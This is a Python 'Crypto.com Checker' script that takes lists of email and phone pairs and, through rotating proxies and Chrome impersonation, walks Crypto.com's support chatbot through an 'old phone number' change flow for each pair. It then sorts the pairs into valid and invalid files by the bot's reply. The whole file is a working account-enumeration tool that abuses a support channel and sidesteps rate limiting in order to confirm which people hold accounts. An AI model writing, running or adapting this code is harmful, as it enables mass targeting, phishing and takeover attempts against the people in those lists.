import random
import toml
import re
import time
import phonenumbers
import pycountry
import json
import requests
import asyncio

from uuid import uuid4
from functools import wraps
from enum import Enum
from logmagix import Logger, Home
from phonenumbers import geocoder

from rnet import Emulation, Proxy, Method, Client, OrigHeaderMap 

with open('input/config.toml') as f:
    config = toml.load(f)

DEBUG = config['dev'].get('Debug', False)

log = Logger()

def debug(func_or_message, *args, **kwargs) -> callable:
    if callable(func_or_message):
        if asyncio.iscoroutinefunction(func_or_message):
            @wraps(func_or_message)
            async def async_wrapper(*args, **kwargs):
                result = await func_or_message(*args, **kwargs)
                if DEBUG:
                    log.debug(f"{func_or_message.__name__} returned: {result}")
                return result
            return async_wrapper
        else:
            @wraps(func_or_message)
            def wrapper(*args, **kwargs):
                result = func_or_message(*args, **kwargs)
                if DEBUG:
                    log.debug(f"{func_or_message.__name__} returned: {result}")
                return result
            return wrapper
    else:
        if DEBUG:
            log.debug(f"Debug: {func_or_message}")

async def debug_response(response) -> None:
    debug(response.headers)
    debug(response.cookies)
    try:
        debug(await response.text())
    except:
        debug(response.content)
    
    try:
        debug(response.status.as_int())
    except:
        debug(response.status_code)

class Status(Enum):
    INVALID = 0
    VALID = 1
    ERROR = 2

class Miscellaneous:
    @debug
    def get_proxies(self) -> dict:
        try:
            if config['dev'].get('Proxyless', False):
                return None
                
            with open('input/proxies.txt') as f:
                proxies = [line.strip() for line in f if line.strip()]
                if not proxies:
                    log.warning("No proxies available. Running in proxyless mode.")
                    return None
                
                proxy_choice = random.choice(proxies)
                proxy_list = [
                    Proxy.all(
                        url=f"http://{proxy_choice}" if not proxy_choice.startswith(("http://", "https://")) else proxy_choice,
                    )
                ]

            debug(f"Proxies configured: {proxies}")
            return proxy_list
        except FileNotFoundError:
            log.failure("Proxy file not found. Running in proxyless mode.")
            return None

    @debug 
    def get_user_agent(self) -> str:
        response = requests.get("https://raw.githubusercontent.com/ptraced/latest-useragents/refs/heads/main/useragents.json")
        if response.status_code == 200:
            # Try standard JSON parse first
            try:
                ua_list = response.json().get("Desktop_Useragents")
                if ua_list:
                    return random.choice(ua_list)
            except Exception:
                # Try a tolerant parse: remove trailing commas before closing brackets/braces
                try:
                    text = response.content.decode('utf-8')
                    cleaned = re.sub(r",\s*[\r\n]+\s*([\]}])", r"\1", text)
                    parsed = json.loads(cleaned)
                    ua_list = parsed.get("Desktop_Useragents")
                    if ua_list:
                        return random.choice(ua_list)
                except Exception:
                    # Give up and fall back
                    log.warning("Failed to parse remote user agents; using default user agent")
        else:
            log.warning("Failed to fetch latests user agent using default one")

        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

    @debug
    def get_phone_region(self, number: str, lang: str = "en"):
        try:
            # Accept numbers passed as strings; if a set/list is accidentally passed, coerce to string
            if isinstance(number, (set, list, tuple)):
                number = next(iter(number)) if number else ""

            parsed_number = phonenumbers.parse(number, None)
            region = geocoder.description_for_number(parsed_number, lang)
            country_code = phonenumbers.region_code_for_number(parsed_number)
            country = pycountry.countries.get(alpha_2=country_code).name if country_code else None


            # Format as +CountryCodeNumber without spaces/dashes
            formatted = f"+{parsed_number.country_code} {parsed_number.national_number}"

            return {
                "valid": phonenumbers.is_valid_number(parsed_number),
                "country_code": country_code,
                "region": region,
                "country": country,
                "formatted": formatted
            }
        except Exception as e:
            return {"error": str(e)}

class AccountChecker:
    def __init__(self, misc: Miscellaneous, proxy_list: list):
        self.id = f"web{str(uuid4())}"
        self.client_chat_id = None
        self.token = None
        self.misc = misc

        # Initialize the session
        self.headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'connection': 'keep-alive',
            'content-type': 'application/json',
            'host': 'alfred-gateway.crypto.com',
            'origin': 'https://chat.crypto.com',
            'referer': 'https://chat.crypto.com/',
            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': self.misc.get_user_agent(),
            'x-crypto-user-uuid': self.id,
            'x-user-type': 'web',
        }
        
        self.session = Client(impersonate=Emulation.Chrome141, proxies=proxy_list, headers=self.headers)

    async def _retry_request(self, method, url, **kwargs):
        max_retries = 2
        for _ in range(max_retries):
            response = await self.session.request(method, url, **kwargs)
            if response.status.as_int() == 429:
                log.warning(f"429 Too Many Requests (cloudflare block). Retrying...")
                await asyncio.sleep(2)
            else:
                return response
        log.failure(f"Max retries reached for {url}")
        return response

    @debug
    async def get_authorization_token(self, id: str = None) -> str | None:
        data = {"user_id": id if id is not None else self.id}

        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/user/token", json=data)

        await debug_response(response)

        if response.status.as_int() == 201:
            response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/user/token", headers={"Authorization": f"Bearer {self.token}"}, json=data)
            await debug_response(response)

            resp_json = await response.json()
            self.token = resp_json.get("token")

            return self.token
        else:
            # Ensure response.text() is a string before using it
            text = await response.text()
            if isinstance(text, str):
                log.failure(f"Failed to fetch authorization token: {text}, {response.status.as_int()}")
            else:
                log.failure("Failed to fetch authorization token: Response text is not a string.")

        return None

    @debug
    async def create_chat(self) -> bool:
        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "last_chat_message": True,
            "country": "FRA"
        }

        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/messages", headers={"Authorization": f"Bearer {self.token}"}, json=data)
        
        await debug_response(response)

        if response.status.as_int() == 201:
            return True
        else:
            text = await response.text()
            if isinstance(text, str):
                log.failure(f"Failed to create chat: {text}, {response.status.as_int()}")
            else:
                log.failure("Failed to create chat: Response text is not a string.")

        return False
    
    @debug
    async def send_initial_message(self) -> bool:
        data = {
            'channel_id': 'web',
            'influencer_id': 'ab7d6750-10a2-4a09-87cd-6f2b68be100f',
            'content': '',
            'message_type': 12,
            'transient': True,
        }

        response = await self._retry_request(Method.OPTIONS, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)
        await debug_response(response)

        if response.status.as_int() != 204:
            text = await response.text()
            log.failure(f"Failed OPTIONS request before sending initial message: {text}, {response.status.as_int()}")
            return False

        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)
        await debug_response(response)
        

        if response.status.as_int() == 201:
            return True
        elif "Access denied" in await response.text():
            log.failure("Access denied in response text.")
        else:
            text = await response.text()
            log.failure(f"Failed to send initial message: {text}, {response.status.as_int()}")
         
        return False

    @debug
    async def set_language(self) -> str | None:
        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "content": "21916380-9a81-4b10-935b-df8850bc6984",
            "new_conversation": True,
            "message_type": 12,
            "language": "en",
            "assistant_id": "en-0-8-0",
            "assistant_name": "General Support",
            "node_id": "21916380-9a81-4b10-935b-df8850bc6984",
            "session_info": {
                "user_type": "web",
                "region": "fr",
                "country": "FRA",
                "currency": "EUR",
                "language": "en",
                "assistant_id": "en-0-8-0",
                "assistant_name": "General Support"
            }
        }

        response = await self._retry_request(Method.OPTIONS, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"})

        await debug_response(response)

        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)

        await debug_response(response)

        if response.status.as_int() == 201:
            resp_json = await response.json()
            chat_id = resp_json.get("client_chat_id")
            
            self.client_chat_id = chat_id
            
            return chat_id
        else:
            text = await response.text()
            log.failure(f"Failed to set language: {text}, {response.status.as_int()}")
        
        return None
    
    @debug
    async def set_type(self) -> bool:
        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "content": "75068320-23cb-4f4d-a2a1-26208c827f51",
            "message_type": 12,
            "client_chat_id": self.client_chat_id
        }

        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"},  json=data)

        await debug_response(response)

        if response.status.as_int() == 201:
            return True
        else:
            text = await response.text()
            log.failure(f"Failed to set phone: {text}, {response.status.as_int()}")
        
        return False

    @debug
    async def set_phone(self) -> bool:
        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "content": "728e6650-e2f1-4477-9be8-decb67b43d4b",
            "message_type": 12,
            "client_chat_id": self.client_chat_id
        }

        response = await self._retry_request(Method.OPTIONS, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"})

        await debug_response(response)

        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)


        await debug_response(response)

        if response.status.as_int() == 201:
            return True
        else:
            text = await response.text()
            log.failure(f"Failed to set phone: {text}, {response.status.as_int()}")
        
        return False
    
    @debug
    async def set_agreement(self) -> bool:
        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "content": "a1fc60f7-adda-4aab-b07e-7aa2917b3c35",
            "message_type": 12,
            "client_chat_id": self.client_chat_id
        }

        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)

        await debug_response(response)

        if response.status.as_int() == 201:
            return True
        else:
            text = await response.text()
            log.failure(f"Failed to set agreement: {text}, {response.status.as_int()}")
        
        return False
    
    @debug
    async def set_further_assistance(self) -> bool:
        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "content": "c1ae35db-c5c7-4d6b-89e9-277d3ba3c6a0",
            "message_type": 12,
            "client_chat_id": self.client_chat_id
        }

        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)

        await debug_response(response)

        if response.status.as_int() == 201:
            return True
        else:
            text = await response.text()
            log.failure(f"Failed to set further assistance: {text}, {response.status.as_int()}")
        
        return False
    
    @debug
    async def submit(self, email: str, phone: str) -> Status:
        phone_data = self.misc.get_phone_region(phone)

        region = phone_data.get("region")
        country_name = phone_data.get("country") or "Unknown"

        if country_name == "United States" and region != "New York":
            country = f"{country_name} (except New York)"
        else:
            country = country_name

        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "content": f"Old phone number: {phone_data.get('formatted')}\nCountry/region: {country}\nEmail: {email}",
            "message_type": 1,
            "client_chat_id": self.client_chat_id
        }

        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)

        await debug_response(response)

        debug(f"Submission payload: {data}")

        if response.status.as_int() == 201:
            # Ensure response.json().get("text") is a string before checking
            resp_json = await response.json()
            if isinstance(resp_json.get("text"), str) and "Thank you for" in resp_json.get("text"):
                return Status.VALID
            else:
                return Status.INVALID
        else:
            text = await response.text()
            log.failure(f"Failed to sumbit chat: {text}, {response.status.as_int()}")

            return Status.ERROR

async def check_account(original: str, email: str, phone: str, fmt: str) -> bool:
    try:
        Misc = Miscellaneous()
        proxies = Misc.get_proxies()
        Checker = AccountChecker(Misc, proxies)

        log.info(f"Checking {email[:12]}...")
        if await Checker.get_authorization_token():
            if await Checker.create_chat():
                if await Checker.send_initial_message():
                    if await Checker.set_language():
                        if await Checker.set_type():
                            if await Checker.set_phone():
                                if await Checker.set_agreement():
                                    if await Checker.set_further_assistance():
                                        status = await Checker.submit(email, phone)

                                        if status == Status.VALID:
                                            with open("output/valid.txt", "a", encoding='utf-8') as f:
                                                if fmt == "colon":
                                                    f.write(f"{email}:{phone}\n")
                                                elif fmt == "csv":
                                                    parts = original.split(",")
                                                    parts[-2] = phone
                                                    parts[-1] = email
                                                    f.write(",".join(parts) + "\n")
                                            
                                            log.success(f"Valid account: {email[:12]}...")
                                            return True

                                        elif status == Status.INVALID:
                                            with open("output/invalid.txt", "a", encoding='utf-8') as f:
                                                if fmt == "colon":
                                                    f.write(f"{email}:{phone}\n")
                                                elif fmt == "csv":
                                                    parts = original.split(",")
                                                    parts[-2] = phone
                                                    parts[-1] = email
                                                    f.write(",".join(parts) + "\n")
                                            
                                            log.failure(f"Invalid account: {email[:12]}...", level="INVALID")
                                            return True
                                        else:
                                            return False

        return False
    except Exception as e:
        log.failure(f"Error during account checking process: {e}")
        return False

def parse_account_line(line: str):
    original_line = line.strip()
    if "," in line:  # CSV-like format
        parts = line.split(",")
        if len(parts) >= 6:
            email = parts[-1].strip()
            phone = parts[-2].strip()
            # Ensure phone starts with '+1' if '+' is missing
            if not phone.startswith("+"):
                phone = f"+1{phone}"
            return original_line, email, phone, "csv"
    elif ":" in line:  # email:phone format
        email, phone = line.split(":", 1)
        # Ensure phone starts with '+1' if '+' is missing
        if not phone.startswith("+"):
            phone = f"+1{phone}"
        return original_line, email.strip(), phone.strip(), "colon"
    else:
        log.warning(f"Skipping malformed account line: {line.strip()}")
        return None, None, None, None

async def main() -> None:
    try:
        Banner = Home("Crypto.com Checker", align="center", credits="discord.cyberious.xyz")
        
        # Display Banner
        Banner.display()
        thread_count = config['dev'].get('Threads', 1)

        # Read accounts from input/accounts.txt (format: email:phone or CSV-like)
        accounts = []
        try:
            with open('input/accounts.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    original, email, phone, fmt = parse_account_line(line)
                    if email and phone:
                        accounts.append((original, email, phone, fmt))
        except FileNotFoundError:
            log.failure('input/accounts.txt not found')
            return

        # Semaphore to limit concurrency
        semaphore = asyncio.Semaphore(thread_count)

        async def worker(account_tuple):
            original, email, phone, fmt = account_tuple
            async with semaphore:
                max_retries = config["dev"].get("MaxRetries", 3)
                for attempt in range(1, max_retries + 1):
                    try:
                        success = await check_account(original, email, phone, fmt)
                        if success:
                            return True
                        else:
                            log.warning(f"Attempt {attempt} failed for {email}. Retrying...")
                    except Exception as e:
                        log.failure(f"Exception on attempt {attempt} for {email}: {e}")
                    await asyncio.sleep(0.5)

                # All retries exhausted; record into error.txt
                with open('output/error.txt', 'a', encoding='utf-8') as ef:
                    if fmt == "colon":
                        ef.write(f"{email}:{phone}\n")
                    elif fmt == "csv":
                        parts = original.split(",")
                        parts[-2] = phone
                        parts[-1] = email
                        ef.write(",".join(parts) + "\n")
                log.failure(f"Exhausted retries for {email}. Recorded to output/error.txt")
                return False

        # Process accounts concurrently
        await asyncio.gather(*[worker(acc) for acc in accounts])

    except KeyboardInterrupt:
        log.info("Process interrupted by user. Exiting...")
    except Exception as e:
        log.failure(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    asyncio.run(main())